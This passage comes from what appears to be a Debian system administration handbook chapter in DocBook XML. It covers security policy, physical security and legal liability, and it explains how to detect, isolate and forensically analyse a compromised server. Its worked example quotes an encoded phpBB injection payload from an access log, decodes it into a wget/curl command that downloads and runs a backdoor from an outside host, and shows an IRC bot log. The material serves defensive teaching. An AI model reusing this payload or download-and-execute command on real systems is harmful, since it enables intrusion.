	security vulnerabilities it could contain. Such audits are usually
	proactive and they are conducted to ensure a program meets certain
	security requirements.</para>
      </sidebar>

      <para>In the free software world, there is generally ample room for
      choice, and choosing one piece of software over another should be a
      decision based on the criteria that apply locally. More features
      imply an increased risk of a vulnerability hiding in the code; picking
      the most advanced program for a task may actually be
      counter-productive, and a better approach is usually to pick the
      simplest program that meets the requirements.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Zero-day exploit</title>

	<para>A <emphasis>zero-day exploit</emphasis> attack is hard to
	prevent; the term covers a vulnerability that is not yet known to
	the authors of the program.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Managing a Machine as a Whole</title>

      <para>Most Linux distributions install by default a number of Unix
      services and many tools. In many cases, these services and tools are
      not required for the actual purposes for which the administrator set
      up the machine. As a general guideline in security matters, unneeded
      software is best uninstalled. Indeed, there is no point in securing an
      FTP server, if a vulnerability in a different, unused service can be
      used to get administrator privileges on the whole machine.</para>

      <para>By the same reasoning, firewalls will often be configured to
      only allow access to services that are meant to be publicly
      accessible.</para>

      <para>Current computers are powerful enough to allow hosting several
      services on the same physical machine. From an economic viewpoint,
      such a possibility is interesting: only one computer to administrate,
      lower energy consumption, and so on. From the security point of view,
      however, such a choice can be a problem. One compromised service can
      bring access to the whole machine, which in turn compromises the
      other services hosted on the same computer. This risk can be
      mitigated by isolating the services. This can be attained either with
      virtualization (each service being hosted in a dedicated virtual
      machine or container), or with AppArmor/SELinux (each service daemon
      having an adequately designed set of permissions).</para>
    </section>
    <section id="sect.users-are-players">
      <title>Users Are Players</title>

      <para>Discussing security immediately brings to mind protection
      against attacks by anonymous crackers hiding in the Internet jungle;
      but an often-forgotten fact is that risks also come from inside: an
      employee about to leave the company could download sensitive files on
      the important projects and sell them to competitors, a negligent
      salesman could leave their desk without locking their session during
      a meeting with a new prospect, a clumsy user could delete the wrong
      directory by mistake, and so on.</para>

      <para>The response to these risks can involve technical solutions: no
      more than the required permissions should be granted to users, and
      regular backups are a must. But in many cases, the appropriate
      protection is going to involve training users to avoid the
      risks.</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>The <emphasis role="pkg">autolog</emphasis> package provides
	a program that automatically disconnects inactive users after a
	configurable delay. It also allows killing user processes that
	persist after a session ends, thereby preventing users from running
	daemons.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Physical Security</title>

      <para>There is no point in securing the services and networks if the
      computers themselves are not protected. Important data deserve being
      stored on hot-swappable hard disks in RAID arrays, because hard disks
      fail eventually and data availability is a must. But if any pizza
      delivery boy can enter the building, sneak into the server room and
      run away with a few selected hard disks, an important part of
      security is not fulfilled. Who can enter the server room? Is access
      monitored? These questions deserve consideration (and an answer) when
      physical security is being evaluated.</para>

      <para>Physical security also includes taking into consideration the
      risks for accidents such as fires. This particular risk is what
      justifies storing the backup media in a separate building, or at
      least in a fire-proof strongbox.</para>
    </section>
    <section>
      <title>Legal Liability</title>

      <para>An administrator is, more or less implicitly, trusted by their
      users as well as the users of the network in general. They should
      therefore avoid any negligence that malevolent people could
      exploit.</para>

      <para>An attacker taking control of your machine then using it as a
      forward base (known as a “relay system”) from which to perform
      other nefarious activities could cause legal trouble for you, since
      the attacked party would initially see the attack coming from your
      system, and therefore consider you as the attacker (or as an
      accomplice). In many cases, the attacker will use your server as a
      relay to send spam, which shouldn't have much impact (except
      potentially registration on black lists that could restrict your
      ability to send legitimate emails), but won't be pleasant,
      nevertheless. In other cases, more important trouble can be caused
      from your machine, for instance, denial of service attacks. This will
      sometimes induce loss of revenue, since the legitimate services will
      be unavailable and data can be destroyed; sometimes this will also
      imply a real cost, because the attacked party can start legal
      proceedings against you. Rights-holders can sue you if an
      unauthorized copy of a work protected by copyright law is shared from
      your server, as well as other companies compelled by service level
      agreements if they are bound to pay penalties following the attack
      from your machine.</para>

      <para>When these situations occur, claiming innocence is not usually
      enough; at the very least, you will need convincing evidence showing
      suspect activity on your system coming from a given IP address. This
      won't be possible if you neglect the recommendations of this chapter
      and let the attacker obtain access to a privileged account (root, in
      particular) and use it to cover their tracks.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>Dealing with a Compromised Machine</title>

    <para>Despite the best intentions and however carefully designed the
    security policy, an administrator eventually faces an act of hijacking.
    This section provides a few guidelines on how to react when confronted
    with these unfortunate circumstances.</para>
    <section>
      <title>Detecting and Seeing the Cracker's Intrusion</title>

      <para>The first step of reacting to cracking is to be aware of such
      an act. This is not self-evident, especially without an adequate
      monitoring infrastructure.</para>

      <para>Cracking acts are often not detected until they have direct
      consequences on the legitimate services hosted on the machine, such
      as connections slowing down, some users being unable to connect, or
      any other kind of malfunction. Faced with these problems, the
      administrator needs to have a good look at the machine and carefully
      scrutinize what misbehaves. This is usually the time when they
      discover an unusual process, for instance, one named
      <literal>apache</literal> instead of the standard
      <literal>/usr/sbin/apache2</literal>. If we follow that example, the
      thing to do is to note its process identifier, and check
      <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see
      what program this process is currently running:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>A program installed under <filename>/var/tmp/</filename> and
      running as the web server? No doubt left, the machine is
      compromised.</para>

      <para>This is only one example, but many other hints can ring the
      administrator's bell:</para>
      <itemizedlist>
        <listitem>
	  <para>an option to a command that no longer works; the version of
	  the software that the command claims to be doesn't match the
	  version that is supposed to be installed according to
	  <command>dpkg</command>;</para>
        </listitem>
        <listitem>
	  <para>a command prompt or a session greeting indicating that the
	  last connection came from an unknown server on another
	  continent;</para>
        </listitem>
        <listitem>
	  <para>errors caused by the <filename>/tmp/</filename> partition
	  being full, which turned out to be full of illegal copies of
	  movies;</para>
        </listitem>
        <listitem>
	  <para>and so on.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Putting the Server Off-Line</title>

      <para>In any but the most exotic cases, the cracking comes from the
      network, and the attacker needs a working network to reach their
      targets (access confidential data, share illegal files, hide their
      identity by using the machine as a relay, and so on). Unplugging the
      computer from the network will prevent the attacker from reaching
      these targets, if they haven't managed to do so yet.</para>

      <para>This may only be possible if the server is physically
      accessible. When the server is hosted in a hosting provider's data
      center halfway across the country, or if the server is not accessible
      for any other reason, it is usually a good idea to start by gathering
      some important information (see <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence"/>,
      <xref linkend="sect.forensic-analysis"/> and
      <xref linkend="sect.reconstituting-the-attack-scenario"/>), then isolating
      that server as much as possible by shutting down as many services as
      possible (usually, everything but <command>sshd</command>). This case
      is still awkward, since one can't rule out the possibility of the
      attacker having SSH access like the administrator has; this makes it
      harder to “clean” the machines.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Keeping Everything that Could Be Used as Evidence</title>

      <para>Understanding the attack and/or engaging legal action against
      the attackers requires taking copies of all the important elements;
      this includes the contents of the hard disk, a list of all running
      processes, and a list of all open connections. The contents of the
      RAM could also be used, but it is rarely used in practice.</para>

      <para>In the heat of action, administrators are often tempted to
      perform many checks on the compromised machine; this is usually not a
      good idea. Every command is potentially subverted and can erase
      pieces of evidence. The checks should be restricted to the minimal
      set (<command>netstat -tupan</command> for network connections,
      <command>ps auxf</command> for a list of processes, <command>ls -alR
      /proc/[0-9]*</command> for a little more information on running
      programs), and every performed check should carefully be written
      down.</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Hot analysis</title>

	<para>While it may seem tempting to analyze the system as it runs,
	especially when the server is not physically reachable, this is
	best avoided: quite simply you can't trust the programs currently
	installed on the compromised system. It is quite possible for a
	subverted <command>ps</command> command to hide some processes, or
	for a subverted <command>ls</command> to hide files; sometimes even
	the kernel is compromised!</para>

	<para>If such a hot analysis is still required, care should be
	taken to only use known-good programs. A good way to do that would
	be to have a rescue CD with pristine programs, or a read-only
	network share. However, even those countermeasures may not be
	enough if the kernel itself is compromised.</para>
      </sidebar>

      <para>Once the “dynamic” elements have been saved, the next step
      is to store a complete image of the hard-disk. Making such an image
      is impossible if the filesystem is still evolving, which is why it
      must be remounted read-only. The simplest solution is often to halt
      the server brutally (after running <command>sync</command>) and
      reboot it on a rescue CD. Each partition should be copied with a tool
      such as <command>dd</command>; these images can be sent to another
      server (possibly with the very convenient <command>nc</command>
      tool). Another possibility may be even simpler: just get the disk out
      of the machine and replace it with a new one that can be reformatted
      and reinstalled.</para>
    </section>
    <section>
      <title>Re-installing</title>
      <indexterm><primary>backdoor</primary></indexterm>

      <para>The server should not be brought back on line without a
      complete reinstallation. If the compromise was severe (if
      administrative privileges were obtained), there is almost no other
      way to be sure that we get rid of everything the attacker may have
      left behind (particularly <emphasis>backdoors</emphasis>). Of course,
      all the latest security updates must also be applied so as to plug
      the vulnerability used by the attacker. Ideally, analyzing the attack
      should point at this attack vector, so one can be sure of actually
      fixing it; otherwise, one can only hope that the vulnerability was
      one of those fixed by the updates.</para>

      <para>Reinstalling a remote server is not always easy; it may involve
      assistance from the hosting company, because not all such companies
      provide automated reinstallation systems. Care should be taken not to
      reinstall the machine from backups taken later than the compromise.
      Ideally, only data should be restored, the actual software should be
      reinstalled from the installation media.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Forensic Analysis</title>

      <para>Now that the service has been restored, it is time to have a
      closer look at the disk images of the compromised system in order to
      understand the attack vector. When mounting these images, care should
      be taken to use the <literal>ro,nodev,noexec,noatime</literal>
      options so as to avoid changing the contents (including timestamps of
      access to files) or running compromised programs by mistake.</para>

      <para>Retracing an attack scenario usually involves looking for
      everything that was modified and executed:</para>
      <itemizedlist>
        <listitem>
	  <para><filename>.bash_history</filename> files often provide for
	  a very interesting read;</para>
        </listitem>
        <listitem>
	  <para>so does listing files that were recently created, modified
	  or accessed;</para>
        </listitem>
        <listitem>
	  <para>the <command>strings</command> command helps identifying
	  programs installed by the attacker, by extracting text strings
	  from a binary;</para>
        </listitem>
        <listitem>
	  <para>the log files in <filename>/var/log/</filename> often allow
	  reconstructing a chronology of events;</para>
        </listitem>
        <listitem>
	  <para>special-purpose tools also allow restoring the contents of
	  potentially deleted files, including log files that attackers
	  often delete.</para>
        </listitem>
      </itemizedlist>

      <para>
        Some of these operations can be made easier with specialized
        software. In particular, the <emphasis role="pkg">sleuthkit</emphasis>
        package provides many tools to analyze a filesystem. Their use is
        made easier by the <emphasis>Autopsy Forensic Browser</emphasis>
        graphical interface (in the <emphasis role="pkg">autopsy</emphasis>
        package). Some Linux distributions have a "live install" image and
        contain many programs for forensic analysis, such as Kali Linux (see
        <xref linkend="sect.kali"/>), with its <emphasis>forensic
        mode</emphasis>, BlackArchLinux<footnote><para>
        <ulink url="https://blackarch.org"/></para></footnote> and the
        commercial Grml-Forensic, based on Grml (see
        <xref linkend="sect.grml"/>).
      </para>
      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Reconstituting the Attack Scenario</title>

      <para>All the elements collected during the analysis should fit
      together like pieces in a jigsaw puzzle; the creation of the first
      suspect files is often correlated with logs proving the breach. A
      real-world example should be more explicit than long theoretical
      ramblings.</para>

      <para>The following log is an extract from an Apache
      <filename>access.log</filename>:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>
        This example matches exploitation of an old security
        vulnerability in phpBB.
        <ulink type="block" url="http://secunia.com/advisories/13239/"/>
        <ulink type="block" url="https://www.phpbb.com/phpBB/viewtopic.php?t=240636"/>
      </para>

      <para>Decoding this long URL leads to understanding that the attacker
      managed to run some PHP code, namely: <command>system("cd /tmp; wget
      gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd;
      chmod +x bd; ./bd &amp;")</command>. Indeed, a
      <filename>bd</filename> file was found in <filename>/tmp/</filename>.
      Running <command>strings /mnt/tmp/bd</command> returns, among other
      strings, <literal>PsychoPhobia Backdoor is starting...</literal>.
      This really looks like a backdoor.</para>

      <para>Some time later, this access was used to download, install and
      run an IRC <emphasis>bot</emphasis> that connected to an underground
      IRC network. The bot could then be controlled via this protocol and
      instructed to download files for sharing. This program even has its
      own log file:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
</programlisting>

      <para>These traces show that two video files have been stored on the
      server by way of the 82.50.72.202 IP address.</para>

      <para>In parallel, the attacker also downloaded a pair of extra
      files, <filename>/tmp/pt</filename> and
      <filename>/tmp/loginx</filename>. Running these files through
      <command>strings</command> leads to strings such as
      <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and
      <foreignphrase>Now wait for suid shell...</foreignphrase>. These look
      like programs exploiting local vulnerabilities to obtain
      administrative privileges. Did they reach their target? In this case,
      probably not, since no files seem to have been modified after the
      initial breach.</para>

      <para>In this example, the whole intrusion has been reconstructed,
      and it can be deduced that the attacker has been able to take
      advantage of the compromised system for about three days; but the
      most important element in the analysis is that the vulnerability has
      been identified, and the administrator can be sure that the new
      installation really does fix the vulnerability.</para>
    </section>
  </section>
</chapter>
<!-- vim: set spell spl=en_us ft=xml tw=79 ts=2 sw=2 ai si et: -->
